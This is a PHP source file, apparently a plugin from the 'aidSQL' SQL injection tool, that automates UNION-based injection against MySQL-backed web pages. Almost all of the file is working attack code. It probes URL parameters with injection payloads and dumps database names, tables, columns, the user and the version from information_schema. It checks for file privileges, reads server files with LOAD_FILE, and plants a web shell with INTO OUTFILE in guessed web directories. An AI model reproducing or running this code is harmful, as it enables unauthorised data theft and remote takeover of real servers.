<?php

	namespace aidSQL\plugin\sqli {

		class MySQL5 extends InjectionPlugin {

			const		PLUGIN_NAME						= "UNION";
			const		PLUGIN_AUTHOR					= "Juan Stange";

			private	$_affectedDatabases			=	array("mysql");
			private	$_strRepeat						=	100;
			private	$_repeatCharacter				=	"a";
			private	$_fields							=	array();
			private	$_vulnerableIndex				=	0;
			private	$_fieldWrapping				=	NULL;
			private	$_injection						=	NULL;
			private	$_groupConcatLength			=	NULL;


			public function injectionUnionWithConcat(){

				$parser	=	new \aidSQL\parser\Generic();

				$openTag				=	"{!";
				$closeTag			=	"!}";

				$hexOpen				=	\String::hexEncode($openTag);
				$hexClose			=	\String::hexEncode($closeTag);

				$parser->setOpenTag($openTag);
				$parser->setCloseTag($closeTag);
				$parser->setLog($this->_logger);

				$this->setParser($parser);

				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;

				if(!$offset){

					throw(new \Exception("Start offset should be an integer greater than 0!"));

				}

				$sqliParams	=	array(
					"space-char"		=>	" ",
					"field-payloads"	=>	explode('_',$this->_config["field-payloads"]),
					"ending-payloads"	=>	array(
						"comment"=>explode('_',$this->_config["comment-payloads"]),
						"order"=>array(
							array("by"=>"1","sort"=>"DESC"),
							array("by"=>"1","sort"=>"ASC"),
							array()
						),
						"limit"=>array(
							array(),
							array("0","1"),
							array("1","1"),
						)
					)
				);

				$this->detectUnionInjection($sqliParams,"unionQuery","CONCAT($hexOpen,%value%,$hexClose)");

				if(sizeof($this->_injection)){

					return TRUE;

				}

				return FALSE;

			}


			private function checkUnionInjectionParameters(Array &$sqliParams){

				if(!isset($sqliParams["field-payloads"])||!is_array($sqliParams["field-payloads"])){
					throw(new \Exception("Invalid field payloads!"));
				}

				if(!isset($sqliParams["ending-payloads"])||!is_array($sqliParams["ending-payloads"])){

					throw(new \Exception("Invalid ending payloads!"));

					if(!isset($sqliParams["comment"])||!is_array($sqliParams["comment"])){

						throw(new \Exception("Comment payloads key inside the ending-payloads array should be an array!"));

					}elseif(!isset($sqliParams["order"])){

						$sqliParams["order"]	=	array();

					}elseif(!isset($sqliParams["limit"])){

						$sqliParams["limit"]	=	array();

					}

				}

			}

			private function makeImpossibleValue($value){

				if(is_numeric($value)){
					return '9e99';
				}

				return md5(rand()*time());

			}

			private function detectUnionInjection(Array $sqliParams,$callback=NULL,$wrapping=NULL,$value=NULL){

				$this->checkUnionInjectionParameters($sqliParams);

				$requestVariables	=	$this->_httpAdapter->getUrl()->getQueryAsArray();

				foreach($requestVariables as $requestVariable=>$requestVariableValue){

					$iterationContainer	=	array();

					for($maxFields=1;$maxFields<=$this->_injectionAttempts;$maxFields++){

						$iterationContainer[]	=	(!empty($value))	?	$value	:	$maxFields;

						foreach($sqliParams["field-payloads"] as $payLoad){

							foreach($sqliParams["ending-payloads"]["comment"] as $comment) {

								foreach($sqliParams["ending-payloads"]["order"] as $order){

									foreach($sqliParams["ending-payloads"]["limit"] as $limit){

										if(!empty($wrapping)){
											$values	=	$this->_queryBuilder->wrapArray($iterationContainer,$wrapping);
										}else{
											$values	=	$iterationContainer;
										}

										$this->_queryBuilder->setCommentOpen($comment);
										$this->_queryBuilder->union($values,"ALL");

										if(sizeof($order)){

											$this->_queryBuilder->orderBy($order["by"],$order["sort"]);

										}

										if(sizeof($limit)){

											$this->_queryBuilder->limit($limit);

										}

										$space			=	$this->_queryBuilder->getSpaceCharacter();

										$madeUpValue	=	$this->makeImpossibleValue($requestVariableValue);

										$sql				=	$madeUpValue.$payLoad.
																$space.$this->_queryBuilder->getSQL().$comment;

										$this->_queryBuilder->setSQL($sql);

										$result			=	$this->query($requestVariable,$callback);

										if($result){

											$this->_injection	=	array(
																				"index"				=>	$maxFields,	
																				"fieldValues"		=>	$iterationContainer,
																				"requestVariable"	=>	$requestVariable,
																				"requestValue"		=>	$madeUpValue,
																				"wrapping"			=>	$wrapping,
																				"payload"			=>	$payLoad,		//constant
																				"limit"				=>	$limit,			//variable 
																				"order"				=>	$order,			//variable
																				"comment"			=>	$comment,		//constant
																				"callback"			=>	$callback
	
											);

											return TRUE;

										}

									}	//limit

								}	//order

							}	//comment

							$url	=	$this->_httpAdapter->getUrl();
							$url->addRequestVariable($requestVariable,$value); 
							$this->_httpAdapter->setUrl($url);

						}	//field-payload

					}	//maxfields

				}	//requestVariables

				return FALSE;

			}

			private function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){

				$params			=	&$this->_injection;

				foreach($params["fieldValues"] as &$val){
					$val	=	$value;	
				}

				$params["fieldValues"]	=	$this->_queryBuilder->wrapArray($params["fieldValues"],$params["wrapping"]);

				$this->_queryBuilder->union($params["fieldValues"],"ALL");

				if(!is_null($from)){
					$this->_queryBuilder->from($from);
				}

				if(sizeof($where)){
					$this->_queryBuilder->where($where);
				}

				if(sizeof($group)){
					$this->_queryBuilder->group($group);
				}

				if(isset($params["order"]["by"])){
					$this->_queryBuilder->orderBy($params["order"]["by"],$params["order"]["sort"]);
				}

				if(is_array($params["limit"])&&sizeof($params["limit"])){
					$this->_queryBuilder->limit($params["limit"]);
				}

				$sql		=	$this->_queryBuilder->getSQL();
				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];

				$this->_queryBuilder->setSQL($sql);

				return parent::query($params["requestVariable"],__FUNCTION__);

			}

			public function getAffectedDatabases(){
				return $this->_affectedDatabases;
			}


			private function detectTruncatedData($string=NULL,$length){

				if(strlen($string) == $length){

					$this->log("Warning! Detected possibly truncated data!",2,"yellow");
					return TRUE;

				}

				return FALSE;
			
			}

			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
			//some databases can be pretty massive, and the default length of characters brough by GROUP_CONCAT is 1024
			//in MySQL, in this way we make sure that the retrieved data has not been truncated. 
			//If it is we can take other action in order to get what we need.

			private function getGroupConcatLength(){

				if(!is_null($this->_groupConcatLength)){
					return $this->_groupConcatLength;
				}

				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");

				$callback	=	$this->_injection["callback"];
				$length		=	$this->$callback("@@group_concat_max_len");

				$this->_groupConcatLength = $length[0];

				return $this->_groupConcatLength;

			}

			//Suppose you have detected truncated data, well, bad luck.
			//Hopefully we can count the registers and do a limit iteration	
			//through that :)

			private function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array()){

				$count	=	$this->unionQuery("COUNT($value)",$from,$where,$group);
				$count	=	$count[0];

				$restoreLimit	=	$this->_injection["limit"];
				$results			=	array();

				for($i=0;$i<$count;$i++){

					$this->_injection["limit"]	=	array($i,1);
					$result		=	$this->unionQuery($value,$from,$where,$group);	
					$results[]	=	$result[0];

				}

				$this->_injection["limit"]	=	$restoreLimit;

				return $results;

			}


			public function getSchemas($complete=TRUE){

				$groupConcatLength	=	$this->getGroupConcatLength();
				$version					=	$this->getVersion();
				$version					=	$version[0];
				$databases				=	$this->unionQuery("GROUP_CONCAT(DISTINCT(TABLE_SCHEMA))","information_schema.tables",array());
				$databases				=	$databases[0];
				$user						=	$this->getUser();
				$user						=	$user[0];

				if($this->detectTruncatedData($databases,$groupConcatLength)){

					$databases	=	$this->unionQueryIterateLimit("DISTINCT(TABLE_SCHEMA)","information_schema.tables");

				}else{

					$databases	=	explode(',',$databases);

				}

				foreach($databases as $database){

					if ($database	==	"information_schema"){
						$this->log("Skipping fetching information_schema databse",0,"yellow");
						continue;
					}

					$dbSchema	=	new \aidSQL\core\DatabaseSchema();

					$dbSchema->setDbName($database);
					$dbSchema->setDbVersion($version);
					$dbSchema->setDbUser($user);

					$this->log("FOUND DATABASE $database",0,"light_purple");

					$tables	=	$this->unionQuery("GROUP_CONCAT(TABLE_NAME)","information_schema.tables",array("table_schema=".\String::hexEncode($database)));
					$tables	=	$tables[0];
				
					if($this->detectTruncatedData($tables,$groupConcatLength)){

						$tables	=	$this->unionQueryIterateLimit("TABLE_NAME","information_schema.tables",array("table_schema=".\String::hexEncode($database)));

					}else{

						$tables	=	explode(',',$tables);

					}

					foreach($tables as $table){

						$dbSchema->addTable($table,array());

					}

					$this->addSchema($dbSchema);	

				}

			}

			public function getColumns($table=NULL){

				if(is_null($table)){

					throw(new \Exception("ERROR: Table name cannot be empty when trying to fetch columns! (Please report bug)"));
					return array();

				}

				$this->log("Fetching table \"$table\" columns ...",0,"white");

				$select							=	"GROUP_CONCAT(COLUMN_NAME)";
				$from								=	"FROM information_schema.columns WHERE table_schema=DATABASE() ".
														"AND table_name=".\String::hexEncode($table);

				$restoreTerminatingPayload	=	$this->_currTerminatingPayload;
				$this->_currTerminatingPayload	=	"ORDER BY 1 DESC";

				$tableFields	=	$this->execute($select,$from);

				if($this->detectTruncatedData($tableFields)){

					$limit			=	1;
					$select			=	"COLUMN_NAME";
					$from				=	"FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=$table";

					$tableFields					=	array();

					while($field	=	$this->execute($select,$from)){

						$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit.",1";
						$limit++;
						$tableFields[]	=	$field;

					}


				}else{

					$tableFields	=	explode(',',$tableFields);

					if(!is_array($tableFields)){

						$tableFields	=	array();

					}
					
				}

				$this->_currTerminatingPayload	=	$restoreTerminatingPayload;

				return $tableFields;

			}

			public function getUser(){

				$callback	=	$this->_injection["callback"];
				return $this->$callback("USER()");

			}

			public function getVersion(){

				$callback	=	$this->_injection["callback"];
				return $this->$callback("@@version");
					
			}

			public function getDatadir(){

				$select	= "@@datadir";
				return $this->execute($select);

			}

			public function toFile(File $file){

				$select = "INTO OUT_FILE ";
				return $this->execute($select);

			}

			public function isRoot($dbUser=NULL,\aidSQL\http\Adapter &$adapter=NULL){

				if(empty($dbUser)){
					throw(new \Exception("Database user passed was empty, cant check if its root or not!"));
				}

				if(!strpos($dbUser,"@")){
					throw (new \Exception("No @ found at database user!!!????"));
				}

				$user = substr($dbUser,0,strpos($dbUser,"@"));

				if(strtolower($user)=="root"){
					return TRUE;
				}

				$this->log("User is not root perse, looking up information_schema for file_priv",2,"yellow");

				//Check for the file privilege user permissions for writing
				//What it really takes to get a shell is the file writing privilege

				$filePrivilege	=	$this->checkPrivilege("file_priv",$dbUser);
				return $this->analyzeInjection($filePrivilege);

			}

			private function checkPrivilege($privilege,$user=NULL){

				$privilege			=	\String::hexEncode($privilege);
				$fieldInjection	=	"is_grantable";

				if(is_null($user)){

					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX(USER(),0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX(USER(),0x40,-1),0x27)";

				}else{

					$user					=	\String::hexEncode($user);
					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX($user,0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX($user,0x40,-1),0x27)";

				}

				return $this->generateInjection($fieldInjection,$tableInjection);

			}

			public function loadFile($file=NULL){

				$select	=	"LOAD_FILE(".\String::hexEncode($file).')';	
				$from		=	"";
				return $this->generateInjection($select,$from);	

			}


			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler $crawler,Array $options){

				$restoreUrl				=	$this->_httpAdapter->getUrl();
				$shellCode				=	$this->_shellCode;

				$webDefaultsPlugin	=	$pLoader->getPluginInstance("info","defaults",$this->_httpAdapter,$this->_log);
				$information			=	$webDefaultsPlugin->getInfo();

				if (!is_a($information,"\\aidSQL\\plugin\\info\\InfoResult")){

					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\info\\InfoResult"));
				}

				$webDirectories	=	$information->getWebDirectories();
				
				foreach($crawler->getFiles() as $file=>$type){
	
					$path	=	dirname($file);

					if($path=='.'){
						continue;
					}

					if(!in_array($path,$webDirectories)){

						$this->log("Adding crawler path information: $path",0,"light_green",TRUE);
						array_unshift($webDirectories,$path);

					}

				}

				array_unshift($webDirectories,'');

				$unixDirectories		=	$information->getUnixDirectories();
				$winDirectories		=	$information->getWindowsDirectories();

				if(!sizeof($webDirectories)){

					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red",TRUE);

				}

				$url	=	$this->_httpAdapter->getUrl();
				$host	=	$url->getHost();
				$url	=	$url->getScheme()."://$host";

				$fileName	=	$this->getShellName();

				foreach($webDirectories as $key=>$webDir){

					$webDir	=	trim($webDir,'/').'/';

					foreach($unixDirectories as $unixDir){
	
						$this->_httpAdapter->setUrl($restoreUrl);
			
						$unixDir					=	'/'.trim($unixDir,'/');
						$shellWebLocation		=	$url.'/'.$webDir.$fileName;

						$shellDirLocations	=	array();
						$shellDirLocations[]	=	$unixDir.'/'.$webDir.$fileName;
						$shellDirLocations[]	=	$unixDir.'/'.$host.'/'.$webDir.$fileName;

						if(preg_Match("#www\.#",$host)){
							$shellDirLocations[]	=	$unixDir.'/'.substr($host,strpos($host,'.')+1).'/'.$webDir.$fileName;
						}


						foreach($shellDirLocations as $shellDirLocation){

							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"white");
							$outFile		=	"INTO OUTFILE '$shellDirLocation'";

							$injection	=	$this->generateInjection($shellCode,$outFile);

							try{

								$this->analyzeInjection($injection,FALSE);

								$result			=	$this->analyzeInjection($this->loadFile($shellDirLocation));
								$decodedShell	=	\String::asciiEncode($shellCode);

								if($result!==FALSE&&sizeof($result)){

									if($result[0]==$decodedShell){
										return $shellWebLocation;
									}

								}
							
							}catch(\Exception $e){


							}

						}	

					}

				}


				return FALSE;

			}


			public static function getHelp(\aidSQL\core\Logger $logger){

				$logger->log("--sqli-mysql5-injection-attempts\tAt how many attempts shall we stop trying");
				$logger->log("--sqli-mysql5-start-offset\t\t<integer>Start the UNION injection at this offset (if you know what youre doing)");
				$logger->log("--sqli-mysql5-var-count\t\t<integer> Try this amount of variables per link");
				$logger->log("--sqli-numeric-only\t\t\tOnly try to perform injection on integer fields");
				$logger->log("--sqli-mysql5-strings-only\t\tOnly try to perform injection on string fields");
				$logger->log("--sqli-mysql5-field-payloads\t\tSet field payloads delimited by _\ti.e: _'_')_%)");
				$logger->log("--sqli-mysql5-ending-payloads\t\tSet ending payloads delimited by _\ti.e: LIMIT 1,1_ORDER BY 1");
				$logger->log("--sqli-mysql5-comment-payloads\t\tSet comment payloads delimited by _\ti.e: #_/*_--");
				$logger->log("--sqli-mysql5-shell-code\tPut your favorite shell code here i.e ".'<?php var_dump($_SERVER);?>');

			}

		}

	}
?>
